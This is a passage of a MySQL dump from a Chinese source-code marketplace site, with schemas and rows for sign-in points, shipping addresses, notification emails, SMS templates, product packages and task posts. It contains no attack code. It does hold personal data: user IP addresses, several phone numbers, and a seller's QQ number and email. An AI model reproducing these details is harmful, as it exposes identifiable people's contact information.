(19, 66, '2017-05-27 13:43:21', '115.231.186.36', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(20, 67, '2017-06-30 00:26:28', '223.157.220.85', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(27, 93, '2017-08-19 08:33:14', '182.242.169.227', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(28, 97, '2017-09-01 21:20:03', '111.198.38.182', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(29, 103, '2017-09-06 13:44:50', '223.96.220.207', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(30, 104, '2017-09-07 01:23:49', '223.96.222.136', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(31, 105, '2017-09-07 13:14:36', '223.96.220.105', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(32, 111, '2017-09-17 21:21:48', '222.242.66.187', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(33, 16, '2017-10-26 22:54:09', '58.16.197.7', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(34, 135, '2017-11-27 11:23:25', '119.176.200.29', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(35, 140, '2017-12-14 20:48:41', '116.18.228.242', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(36, 156, '2018-04-09 03:08:26', '49.118.221.11', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(37, 161, '2018-05-02 22:45:33', '183.226.21.47', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(38, 166, '2018-06-09 11:54:14', '222.125.4.59', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(39, 187, '2018-07-29 15:43:19', '39.176.69.25', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(40, 198, '2018-09-17 13:41:04', '171.109.240.122', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(41, 212, '2018-10-13 22:37:48', '180.88.184.19', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(42, 149, '2019-01-01 14:41:50', '115.197.68.204', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(43, 227, '2019-01-20 22:08:12', '120.230.81.190', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(44, 228, '2019-01-26 22:07:50', '124.115.133.200', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(45, 234, '2019-03-02 17:37:48', '101.130.165.179', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(46, 237, '2019-03-22 15:03:31', '219.138.247.109', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(47, 237, '2019-03-28 20:38:44', '110.52.7.120', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(48, 15, '2019-04-01 22:31:53', '182.123.29.39', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(49, 241, '2019-04-11 18:15:30', '219.134.217.48', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(50, 15, '2019-04-24 17:44:48', '223.157.128.194', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(51, 848, '2019-04-27 02:52:19', '171.37.28.16', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(52, 849, '2019-04-29 00:39:45', '112.224.33.133', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(53, 960, '2019-06-05 16:02:09', '113.65.214.4', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(54, 965, '2019-06-14 14:14:02', '1.194.64.111', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(55, 965, '2019-06-17 10:21:38', '1.194.64.164', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(56, 965, '2019-06-18 19:01:49', '1.194.64.164', '按时签到是个好习惯^_^ 签到拿分走人(连续签到2天)', 6),
(57, 965, '2019-06-19 10:34:27', '1.194.70.62', '按时签到是个好习惯^_^ 签到拿分走人(连续签到3天)', 7),
(58, 15, '2019-06-21 05:11:13', '58.46.62.8', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(59, 965, '2019-06-21 09:43:49', '1.194.69.228', '按时签到是个好习惯^_^ 签到拿分走人', 10);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_qiandaojf`
--

CREATE TABLE IF NOT EXISTS `yjcode_qiandaojf` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `daynum` int(10) DEFAULT NULL,
  `jf` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=26 ;

--
-- 转存表中的数据 `yjcode_qiandaojf`
--

INSERT INTO `yjcode_qiandaojf` (`id`, `daynum`, `jf`) VALUES
(21, 2, 6),
(22, 3, 7),
(23, 4, 8),
(24, 5, 9),
(25, 6, 10);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_shdz`
--

CREATE TABLE IF NOT EXISTS `yjcode_shdz` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `add1` int(10) DEFAULT NULL,
  `add1v` char(50) DEFAULT NULL,
  `add2` int(10) DEFAULT NULL,
  `add2v` char(50) DEFAULT NULL,
  `add3` int(10) DEFAULT NULL,
  `add3v` char(50) DEFAULT NULL,
  `addr` varchar(250) DEFAULT NULL,
  `lxr` char(50) DEFAULT NULL,
  `mot` char(50) DEFAULT NULL,
  `yb` char(50) DEFAULT NULL,
  `ifmr` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=19 ;

--
-- 转存表中的数据 `yjcode_shdz`
--

INSERT INTO `yjcode_shdz` (`id`, `bh`, `userid`, `zt`, `add1`, `add1v`, `add2`, `add2v`, `add3`, `add3v`, `addr`, `lxr`, `mot`, `yb`, `ifmr`, `sj`) VALUES
(8, '1520758284s151', 151, 0, 144, '广东', 531, '阳江市', 539, '阳春市', 'trtretertret', ' reteter', '12345678921', '123456', 0, '2018-03-11 16:52:07'),
(7, '1519624830s149', 149, 0, 144, '广东', 544, '河源市', 498, '紫金县', '12626', '5661231', '15656656544451', '00000', 0, '2018-02-26 14:00:46'),
(9, '1524872882s159', 159, 0, 144, '广东', 544, '河源市', 498, '紫金县', '111111', '111111', '11111111111', '11111', 0, '2018-04-28 07:48:26'),
(10, '1526817390s14', 14, 0, 145, '广西', 14512, '河池市', 1451207, '巴马瑶族自治县', 'retert', 'tert', '45436346', '', 0, '2018-05-20 19:56:39'),
(12, '1528424345s164', 164, 0, 144, '广东', 529, '汕尾市', 499, '陆丰市', '2', '2', '2', '2', 0, '2018-06-08 10:19:11'),
(13, '1532533104s174', 174, 0, 151, '四川', 15117, '巴中市', 1511704, '平昌县', 'fxgc', '25555', '17603424436', '575854', 0, '2018-07-25 23:38:48'),
(14, '1536300749s197', 197, 0, 144, '广东', 5, '广州市', 1440108, '萝岗区', '令山区165号', '张三', '15397462010', '312228', 0, '2018-09-07 14:13:05'),
(18, '1559808140s961', 961, 0, 111, '北京', 1, '北京市', 1110101, '东城区', '11', '111', '15732711111', '', 1, '2019-06-06 16:02:31');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_shopbannar`
--

CREATE TABLE IF NOT EXISTS `yjcode_shopbannar` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `aurl` varchar(250) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `targ` int(10) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `yjcode_shopbannar`
--

INSERT INTO `yjcode_shopbannar` (`id`, `bh`, `userid`, `aurl`, `tit`, `targ`, `xh`, `sj`, `zt`) VALUES
(1, '1522048111b15', 15, 'https://www.163aas.com/', '1', 2, 1, '2018-03-26 15:08:31', 0),
(2, '1522048134b15', 15, 'https://www.163aas.com/', '2', 2, 2, '2018-03-26 15:08:54', 0),
(3, '1522048148b15', 15, 'https://www.163aas.com/', '3', 1, 3, '2018-03-26 15:09:08', 0),
(4, '1526939082b14', 14, 'http://', NULL, 1, 1, '2018-05-22 05:44:42', 99);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_shopfav`
--

CREATE TABLE IF NOT EXISTS `yjcode_shopfav` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `shopid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `yjcode_shopfav`
--

INSERT INTO `yjcode_shopfav` (`id`, `shopid`, `userid`, `sj`) VALUES
(1, 15, 59, '2017-05-13 22:17:33'),
(2, 15, 140, '2017-12-14 20:49:41'),
(3, 15, 960, '2019-06-05 16:34:55');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_shopmenu`
--

CREATE TABLE IF NOT EXISTS `yjcode_shopmenu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `tit1` char(50) DEFAULT NULL,
  `tit2` char(50) DEFAULT NULL,
  `aurl` varchar(250) DEFAULT NULL,
  `targ` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `yjcode_shopmenu`
--

INSERT INTO `yjcode_shopmenu` (`id`, `bh`, `userid`, `tit1`, `tit2`, `aurl`, `targ`, `admin`, `xh`, `sj`, `zt`) VALUES
(2, '1508469511m15', 15, NULL, NULL, 'http://', 1, 1, 1, '2017-10-20 11:18:31', 99),
(3, '1509021963m120', 120, '', NULL, 'http://', 1, 1, 1, '2017-10-26 20:46:03', 0),
(4, '1516695581m126', 126, NULL, NULL, 'http://', 1, 1, 1, '2018-01-23 16:19:41', 99),
(5, '1526939073m14', 14, NULL, NULL, 'http://', 1, 1, 1, '2018-05-22 05:44:33', 99);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_smsmail`
--

CREATE TABLE IF NOT EXISTS `yjcode_smsmail` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `admin` int(10) DEFAULT NULL,
  `fa` char(50) DEFAULT NULL,
  `tyid` int(10) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `txt` text,
  `tit` varchar(250) DEFAULT NULL,
  `selluserid` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=50 ;

--
-- 转存表中的数据 `yjcode_smsmail`
--

INSERT INTO `yjcode_smsmail` (`id`, `admin`, `fa`, `tyid`, `userid`, `txt`, `tit`, `selluserid`) VALUES
(34, 1, 'ceshi11@163.com', 1, 953, '<b>订单编号：</b>1557730372065<br><b>商品名称：</b>新站网，友价源码商城带数据打包出售3月份打包的<br><b>交易金额：</b>100元<br><b>交易时间：</b>2019-05-13 14:52:41<br><b>卖家昵称：</b>一淘模板<br><b>卖家联系QQ：</b>249294043<br><b>注：</b>该源码为手动发货请联系商家QQ249294043发货！<br><br>若1天后您未进行确认收货、延迟、退款操作，交易自动完成，款项将支付于卖家！<br>感谢您对卖家(一淘模板工作室)【及一淘模板商城源码交易源码交易域名交易服务中心】的支持，欢迎您的再次光临。<br><br><font color="#999999"></font>此为系统邮件，请勿回复。<br>来自一淘模板商城源码交易源码交易域名交易服务中心 - <a href="http://t5.928vip.cn/" target="_blank" rel="noopener">http://t5.928vip.cn/</a>，详情可登录 <a href="http://t5.928vip.cn//user" target="_blank" rel="noopener">管理中心</a> 查看', '【源码商城】订单发货通知', 953),
(35, 2, '18073833920', 1, 953, '亲，有新订单啦！请尽快登录网站发货，购买商品为：${tit}', '100.00', 15),
(33, 1, '249294043@qq.com', 1, 953, '<b>订单编号：</b>1557730372065<br><b>商品名称：</b>新站网，友价源码商城带数据打包出售3月份打包的<br><b>交易金额：</b>100元<br><b>交易时间：</b>2019-05-13 14:52:41<br><b>买家昵称：</b>ceshi11<br><b>买家QQ：</b>ceshi11<br><b>注：该商品为手动发货，请尽快给买家发货。<br><br><font color="#999999"></font>此为系统邮件，请勿回复。<br>来自一淘模板商城源码交易源码交易域名交易服务中心 - <a href="http://t5.928vip.cn/" target="_blank" rel="noopener">http://t5.928vip.cn/</a>，详情可登录 <a href="http://t5.928vip.cn//user" target="_blank" rel="noopener">管理中心</a> 查看', '【源码商城】新订单通知', 15);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_smsmb`
--

CREATE TABLE IF NOT EXISTS `yjcode_smsmb` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `mybh` char(20) DEFAULT NULL,
  `txt` text,
  `mbid` char(35) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=9 ;

--
-- 转存表中的数据 `yjcode_smsmb`
--

INSERT INTO `yjcode_smsmb` (`id`, `mybh`, `txt`, `mbid`) VALUES
(1, '001', '验证码：${yzm},您正在找回密码，如果不是本人操作，请忽略此信息。', 'SMS_44325625'),
(2, '002', '验证码：${yzm},您正在进行手机解除绑定，如果不是本人操作，请忽略此信息。', 'SMS_44305463'),
(3, '003', '验证码：${yzm},您正在进行手机绑定，如果不是本人操作，请忽略此信息。', 'SMS_44425647'),
(4, '004', '亲，有新订单啦！请尽快登录网站发货，购买商品为：${tit}', 'SMS_44430701'),
(5, '005', '退款通知：有买家进行了退款，商品单价${money1}元，数量${num}，请尽快登录网站处理', 'SMS_44340804'),
(6, '006', '验证码：${yzm},您正在通过手机验证直接登录，如果不是本人操作，请忽略此信息。', 'SMS_58975228'),
(7, '007', '您的工单状态已经变更为：${zttz}', ''),
(8, '000', '验证码：${yzm},如果不是本人操作，请忽略此信息。', '');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_taocan`
--

CREATE TABLE IF NOT EXISTS `yjcode_taocan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `money1` float DEFAULT NULL,
  `money2` float DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `probh` char(50) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `tit2` char(50) DEFAULT NULL,
  `fhxs` int(10) DEFAULT NULL,
  `wpurl` varchar(250) DEFAULT NULL,
  `wppwd` varchar(200) DEFAULT NULL,
  `upf` varchar(200) DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `kcnum` int(10) DEFAULT NULL,
  `wppwd1` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=75 ;

--
-- 转存表中的数据 `yjcode_taocan`
--

INSERT INTO `yjcode_taocan` (`id`, `money1`, `money2`, `xh`, `probh`, `tit`, `userid`, `admin`, `tit2`, `fhxs`, `wpurl`, `wppwd`, `upf`, `zt`, `kcnum`, `wppwd1`) VALUES
(4, 200, 2650, 1, '1430668588-13', '原版整站', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(5, 400, 3150, 2, '1430668588-13', '原版+红色模板', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(6, 700, 3350, 3, '1430668588-13', '原版+门户模板', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(7, 200, 1600, 1, '1430668915-13', '原版整站', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(8, 1000, 2600, 2, '1430668915-13', '原版+仿互站模板', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(9, 200, 800, 1, '1443620252-13', '商业版本', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(10, 300, 900, 2, '1443620252-13', '商业+手机1模板', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(11, 240, 850, 3, '1443620252-13', '商业+手机2模板', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(30, 50, 100, 1, '1459342724-13', '搞笑视频', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(31, 50, 100, 2, '1459342724-13', '主播视频', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(32, 50, 100, 3, '1459342724-13', '综合视频', 13, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL),
(66, 100, 100, 1, '1554034828-15', '红色', 15, NULL, NULL, 0, '', '', NULL, 0, 0, ''),
(67, 100, 100, 2, '1554034828-15', '尺码', 15, NULL, NULL, 0, '', '', NULL, 0, 0, ''),
(68, 100, 100, 1, '1554034828-15', '红色', 15, 2, '中码', 0, '', '', NULL, 0, 0, ''),
(69, 100, 100, 2, '1554034828-15', '红色', 15, 2, '小马', 0, '', '', NULL, 0, 0, ''),
(70, 100, 100, 3, '1554034828-15', '黑色', 15, NULL, NULL, 0, '', '', NULL, 0, 0, ''),
(72, 45, 10, 4, '1554034828-15', '324', 15, NULL, NULL, 0, '', '', NULL, 0, 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_taocan_kc`
--

CREATE TABLE IF NOT EXISTS `yjcode_taocan_kc` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `tcid` int(10) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `userid1` int(10) DEFAULT NULL,
  `ka` text,
  `mi` varchar(250) DEFAULT NULL,
  `ifok` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_task`
--

CREATE TABLE IF NOT EXISTS `yjcode_task` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `txt` text,
  `type1id` int(10) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `djl` int(10) DEFAULT NULL,
  `type2id` int(10) DEFAULT NULL,
  `money2` float DEFAULT NULL,
  `money3` float DEFAULT NULL,
  `money4` float DEFAULT NULL,
  `lastsj` datetime DEFAULT NULL,
  `useridhf` int(10) DEFAULT NULL,
  `jgxs` int(10) DEFAULT NULL,
  `rwzq` int(10) DEFAULT NULL,
  `yxq` datetime DEFAULT NULL,
  `yjtx` int(10) DEFAULT NULL,
  `qqxs` int(10) DEFAULT NULL,
  `motxs` int(10) DEFAULT NULL,
  `yjfs` int(10) DEFAULT NULL,
  `money5` float DEFAULT NULL,
  `fj` varchar(100) DEFAULT NULL,
  `taskty` int(10) DEFAULT NULL,
  `tasknum` int(10) DEFAULT NULL,
  `taskcy` int(10) DEFAULT NULL,
  `jsbao` float DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=41 ;

--
-- 转存表中的数据 `yjcode_task`
--

INSERT INTO `yjcode_task` (`id`, `bh`, `userid`, `sj`, `zt`, `tit`, `txt`, `type1id`, `money1`, `djl`, `type2id`, `money2`, `money3`, `money4`, `lastsj`, `useridhf`, `jgxs`, `rwzq`, `yxq`, `yjtx`, `qqxs`, `motxs`, `yjfs`, `money5`, `fj`, `taskty`, `tasknum`, `taskcy`, `jsbao`) VALUES
(6, '1493581826task31', 31, '2017-05-01 03:50:26', 10, '9063167489', '<span style="color:#333333;font-family:''microsoft yahei'', 微软雅黑, microsoftjhenghei, 华文细黑, stheiti, mingliu;font-size:14px;line-height:normal;">9063167489</span>', 1, 200, 0, 0, 0, 0, 0, '2017-05-01 03:50:26', 0, 0, 3, '2017-05-04 03:50:26', 0, 1, 1, 0, 0, 'HN-1493581826-31.doc', 0, 1, NULL, NULL),
(7, '1494053667task39', 39, '2017-05-06 14:54:27', 10, '测试', '二手', 1, 11, 0, 11, 0, 0, 0, '2017-05-06 14:54:27', 0, 0, 3, '2017-05-09 14:54:27', 1, 1, 1, 0, 0, '', 0, 1, NULL, NULL),
(8, '1494168857task48', 48, '2017-05-07 22:54:17', 10, 'sDA', 'Dd', 4, 0, 0, 23, 0, 0, 0, '2017-05-07 22:54:17', 0, 0, 3, '2017-05-10 22:54:17', 0, 1, 1, 0, 0, '', 0, 1, NULL, NULL),
(9, '1497013523task66', 66, '2017-06-09 21:05:23', 10, '任务大单测试，', '<p>任务大单测试，</p>', 1, 0, 0, 0, 0, 0, 0, '2017-06-09 21:05:23', 0, 1, 3, '2017-06-12 21:05:23', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(10, '1497013574task66', 66, '2017-06-09 21:06:14', 10, '任务大厅升级版特色，', '<p><img src="/config/ueditor/php/upload1/20170609/14970135714114.jpg" title="TB29eDkhhXlpuFjSsphXXbJOXXa_!!850460505.jpg"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-06-09 21:06:14', 0, 1, 3, '2017-06-12 21:06:14', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(11, '1497774342task39', 39, '2017-06-18 16:25:42', 10, '达到', '<p>的撒旦撒</p>', 1, 11, 0, 0, 0, 0, 0, '2017-06-18 16:25:42', 0, 0, 3, '2017-06-21 16:25:42', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(12, '1499351214task57', 57, '2017-07-06 22:26:54', 10, '单有优惠最新VE云创系统自动化营销电子商务网站建设2017', '<h1 style="margin: 0px auto; padding: 0px; font-size: 20px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; white-space: normal; background-color: rgb(255, 255, 255);">单有优惠最新VE云创系统自动化营销电子商务网站建设2017</h1><p><img src="/config/ueditor/php/upload1/20170706/14993511968532.jpg" title="QQ截图20170706213644.jpg" style="width: 741px; height: 779px;"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:26:54', 0, 1, 3, '2017-07-09 22:26:54', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(13, '1499351264task57', 57, '2017-07-06 22:27:44', 10, '下单有优惠网商之家全民分销系统四站合一电子商务', '<p><img src="/config/ueditor/php/upload1/20170706/14993512458239.jpg" title="1487233816825m.jpg"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:27:44', 0, 1, 3, '2017-07-09 22:27:44', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(14, '1499351329task59', 59, '2017-07-06 22:28:49', 10, '华美淘宝客程序仿新版卷皮模板源码超级搜索采集文章采集2016', '<h1 style="margin: 0px auto; padding: 0px; font-size: 20px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; white-space: normal; background-color: rgb(255, 255, 255);">华美淘宝客程序仿新版卷皮模板源码超级搜索采集文章采集2016</h1><p><img src="/config/ueditor/php/upload1/20170706/14993513125681.jpg" title="1496493316768.jpg"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:28:49', 0, 1, 3, '2017-07-09 22:28:49', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(15, '1499351371task59', 59, '2017-07-06 22:29:31', 10, '华美淘宝客程序仿新版卷皮模板源码超级搜索采集文章采集2016', '<p><img src="/config/ueditor/php/upload1/20170706/14993513447421.jpg" title="TB29eDkhhXlpuFjSsphXXbJOXXa_!!850460505.jpg"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:29:31', 0, 1, 3, '2017-07-09 22:29:31', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(16, '1499351505task14', 14, '2017-07-06 22:31:45', 10, '任务大厅 - 源码商城交易服务中心', '<p>任务大厅 - 源码商城源码交易服务中心</p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:31:45', 0, 1, 3, '2017-07-21 22:31:45', 1, 1, 1, 2, 0, '', 0, 1, 0, NULL),
(17, '1499351601task14', 14, '2017-07-06 22:33:21', 104, '源码商城源码交易服务中心', '<p>任务大厅 - 源码商城源码交易服务中心</p>', 1, 500, 0, 0, 500, 0, 0, '2017-07-06 22:33:21', 0, 0, 3, '2017-07-09 22:33:21', 1, 1, 1, 0, 0, '', 1, 4, 0, NULL),
(18, '1499351656task14', 14, '2017-07-06 22:34:16', 10, '源码商城源码交易', '<p><img src="/config/ueditor/php/upload1/20170706/1499351640234.jpg" title="1487233816825m.jpg"/></p>', 1, 0, 0, 0, 0, 0, 0, '2017-07-06 22:34:16', 0, 1, 3, '2017-07-09 22:34:16', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(19, '1499351829task59', 59, '2017-07-06 22:37:09', 104, '源码商城源码交易服务中心', '<p>源码商城源码交易服务中心<img src="/config/ueditor/php/upload1/20170706/14993518006870.jpg" title="1487233816825m.jpg"/></p>', 1, 1000, 0, 0, 1000, 0, 0, '2017-07-06 22:37:09', 0, 0, 3, '2017-07-09 22:37:09', 0, 1, 1, 0, 0, '', 1, 10, 0, NULL),
(20, '1511113100task128', 128, '2017-11-20 01:38:20', 100, '是否斯蒂芬斯蒂芬的事', '<p>www.91moe.com</p>', 1, 10, 0, 0, 0, 0, 0, '2017-11-20 01:38:20', 0, 0, 0, '2017-11-23 01:38:20', 1, 1, 1, 0, 0, '', 1, 10, 0, NULL),
(26, '1528206141task163', 163, '2018-06-05 21:42:21', 10, '需要开发一个网站，有没有人接任？', '<p>需要开发一个网站，有没有人接任？<img src="http://t5.928vip.cn/config/ueditor/php/upload1/20180605/1528206131427.jpg" title="【新提醒】找苗网-专注于花草苗木类社区电商服务平台.jpg"/><br/></p>', 1, 500, 0, 0, 0, 0, 0, '2018-06-05 21:42:21', 0, 0, 3, '2018-06-08 21:42:35', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(22, '1517667884task15', 15, '2018-02-03 22:24:44', 104, 'VE云创自动化营销程序网商之家进人系统电子商务源码特价', '<h3 class="tb-main-title" data-title="VE云创自动化营销程序网商之家进人系统电子商务源码特价" data-spm-anchor-id="2013.1.iteminfo.i0.67188e62DWq7xM" style="margin: 0px; padding: 0px; font-size: 16px; min-height: 21px; line-height: 21px; color: rgb(60, 60, 60); font-family: tahoma, arial, &#39;Hiragino Sans GB&#39;, 宋体, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">VE云创自动化营销程序网商之家进人系统电子商务源码特价</h3><h3 class="tb-main-title" data-title="VE云创自动化营销程序网商之家进人系统电子商务源码特价" data-spm-anchor-id="2013.1.iteminfo.i0.67188e62DWq7xM" style="margin: 0px; padding: 0px; font-size: 16px; min-height: 21px; line-height: 21px; color: rgb(60, 60, 60); font-family: tahoma, arial, &#39;Hiragino Sans GB&#39;, 宋体, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">VE云创自动化营销程序网商之家进人系统电子商务源码特价</h3><p><br/></p>', 1, 100000, 0, 0, 100000, 0, 0, '2018-02-03 22:24:44', 0, 0, 3, '2018-02-06 22:24:44', 1, 1, 1, 0, 0, '', 1, 2, 0, NULL),
(23, '1517729538task147', 147, '2018-02-04 15:32:18', 10, '顶顶顶顶等等多多多多', '<p>顶顶顶顶等等多多多多</p>', 1, 100, 0, 0, 0, 0, 0, '2018-02-04 15:32:18', 0, 0, 3, '2018-02-07 16:16:07', 1, 1, 1, 0, 0, '', 0, 1, 0, NULL),
(25, '1527819285task14', 14, '2018-06-01 10:14:45', 104, '源码商城接任模板开发修改', '<p>源码商城接任模板开发修改<img src="http://t5.928vip.cn/config/ueditor/php/upload1/20180601/15278192707408.jpg" title="一淘模板友价商城源码_官网地址 http___yj.163aas.com - 一淘模板友价商城源码.jpg"/></p>', 1, 800, 0, 0, 800, 0, 0, '2018-06-01 10:14:45', 0, 0, 3, '2018-06-04 10:15:05', 0, 1, 1, 0, 0, '', 1, 5, 0, NULL),
(27, '1528516326task166', 166, '2018-06-09 11:52:06', 10, '5312523', '<p>523523</p>', 1, 100, 0, 0, 0, 0, 0, '2018-06-09 11:52:06', 0, 0, 3, '2018-06-13 12:04:42', 0, 1, 1, 0, 0, '', 0, 1, 0, NULL),
